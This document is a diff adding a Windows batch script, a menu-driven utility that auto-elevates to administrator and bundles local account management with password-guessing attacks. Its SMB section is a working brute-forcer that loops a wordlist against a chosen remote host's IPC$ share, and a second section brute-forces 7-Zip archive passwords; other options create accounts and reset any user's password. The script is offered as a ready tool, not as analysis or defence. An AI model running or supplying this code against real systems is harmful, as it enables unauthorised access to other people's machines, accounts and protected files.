@@ -1,0 +1,242 @@
+@echo off
+setlocal Enabledelayedexpansion
+color 30
+chcp 65001 >nul
+title zemm's really good script
+
+:: --- AUTOMATIC ADMIN ELEVATION BLOCK ---
+net session >nul 2>&1
+if %errorlevel% NEQ 0 (
+    echo Elevating privileges...
+    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
+    exit /b
+)
+:: ---------------------------------------
+
+:: Set current directory to the script location
+cd /d "%~dp0"
+
+:menu
+title zemm's really good script
+cls
+echo ************************************
+echo                 MENU
+echo ************************************
+echo.
+echo 1) List Users on Computer
+echo 2) Create a New User
+echo 3) Change a User's Password
+echo 4) Run SMB Bruteforce
+echo 5) Run 7-Zip Archive Bruteforce
+echo 6) Delete a User
+echo 7) Open CMD as Another User
+echo 8) Exit zemm's really good script
+echo.
+set "input="
+set /p input="© "
+
+if "%input%" EQU "1" (
+     title List Users
+     cls
+     net user
+     pause
+     goto menu
+)
+if "%input%" EQU "2" (
+     title Create User
+     cls
+     set /p user="USERNAME: "
+     set /p password="PASSWORD: "
+     net user "%user%" "%password%" /add
+     echo.
+     echo New user created with credentials:
+     echo %user% : %password%
+     pause
+     goto menu
+)
+if "%input%" EQU "3" (
+     title Change Password
+     cls
+     set /p targetuser="TARGET USER: "
+     set /p newpass="NEW PASSWORD: "
+     net user "%targetuser%" "%newpass%"
+     echo.
+     echo Password changed successfully.
+     pause
+     goto menu
+)
+if "%input%" EQU "4" (
+     goto smb_bruteforce
+)
+if "%input%" EQU "5" (
+     goto 7zip_bruteforce
+)
+if "%input%" EQU "6" (
+     title Delete User
+     cls
+     set /p deluser="ENTER USERNAME TO DELETE: "
+     echo.
+     echo Are you sure you want to delete user "%deluser%"?
+     pause
+     net user "%deluser%" /delete
+     echo.
+     echo User "%deluser%" has been deleted.
+     pause
+     goto menu
+)
+if "%input%" EQU "7" (
+     goto cmd_session
+)
+if "%input%" EQU "8" exit
+goto menu
+
+:smb_bruteforce
+title SMB Bruteforce - by Ebola Man
+cls
+echo ************************************
+echo            SMB BRUTEFORCE
+echo ************************************
+echo.
+set "target_ip="
+set "target_user="
+set "pass_list="
+
+set /p target_ip="Enter target IP address: "
+set /p target_user="Enter username: "
+set /p pass_list="Enter password list file (e.g., pass.txt): "
+
+if "!target_ip!" EQU "" goto menu
+if "!target_user!" EQU "" goto menu
+
+if not exist "!pass_list!" (
+    echo.
+    echo Error: File "!pass_list!" not found.
+    pause
+    goto menu
+)
+
+echo.
+echo Starting SMB guessing...
+echo.
+
+for /f "usebackq delims=" %%a in ("!pass_list!") do (
+    set "pass=%%a"
+    echo Trying password: !pass!
+    
+    net use \\%target_ip%\IPC$ "!pass!" /user:"%target_user%" >nul 2>&1
+    
+    if !errorlevel! EQU 0 (
+        echo.
+        echo [SUCCESS] Password found: !pass!
+        net use \\%target_ip%\IPC$ /delete >nul 2>&1
+        pause
+        goto menu
+    )
+)
+
+echo.
+echo Password not found in the list.
+pause
+goto menu
+
+:7zip_bruteforce
+title 7-Zip Archive Bruteforce
+cls
+echo ************************************
+echo          7-ZIP BRUTEFORCE
+echo ************************************
+echo.
+
+:: Clear variables to prevent the script from skipping input
+set "archive="
+set "pass_list="
+
+set /p archive="Enter archive file (e.g., secret.7z): "
+set /p pass_list="Enter password list file (e.g., pass.txt): "
+
+:: Check if 7-Zip is installed
+set "sevenzip_path="
+if exist "C:\Program Files\7-Zip\7z.exe" set "sevenzip_path=C:\Program Files\7-Zip\7z.exe"
+if exist "C:\Program Files (x86)\7-Zip\7z.exe" set "sevenzip_path=C:\Program Files (x86)\7-Zip\7z.exe"
+
+if "%sevenzip_path%" EQU "" (
+    echo.
+    echo Error: 7-Zip program not found on the system. Please install it.
+    pause
+    goto menu
+)
+
+if "!archive!" EQU "" (
+    echo.
+    echo Error: Archive file not specified.
+    pause
+    goto menu
+)
+
+if not exist "!archive!" (
+    echo.
+    echo Error: Archive "!archive!" not found.
+    pause
+    goto menu
+)
+
+if "!pass_list!" EQU "" (
+    echo.
+    echo Error: Password list not specified.
+    pause
+    goto menu
+)
+
+if not exist "!pass_list!" (
+    echo.
+    echo Error: File "!pass_list!" not found.
+    pause
+    goto menu
+)
+
+echo.
+echo Starting archive guessing...
+echo.
+
+for /f "usebackq delims=" %%a in ("!pass_list!") do (
+    set "pass=%%a"
+    echo Trying password: !pass!
+    
+    "!sevenzip_path!" t "!archive!" -p"!pass!" -y >nul 2>&1
+    
+    if !errorlevel! EQU 0 (
+        echo.
+        echo [SUCCESS] Archive password found: !pass!
+        pause
+        goto menu
+    )
+)
+
+echo.
+echo Password not found in the list.
+pause
+goto menu
+
+:cmd_session
+title Open CMD as Another User
+cls
+echo ************************************
+echo       OPEN CMD AS ANOTHER USER
+echo ************************************
+echo.
+set "runuser="
+set /p runuser="Enter username: "
+
+if "!runuser!" EQU "" goto menu
+
+echo.
+echo A new window will open. You will need to enter the password for user "!runuser!".
+echo Press any key to continue...
+pause >nul
+
+runas /user:"!runuser!" cmd.exe
+
+echo.
+echo Request sent for system processing.
+pause
+goto menu
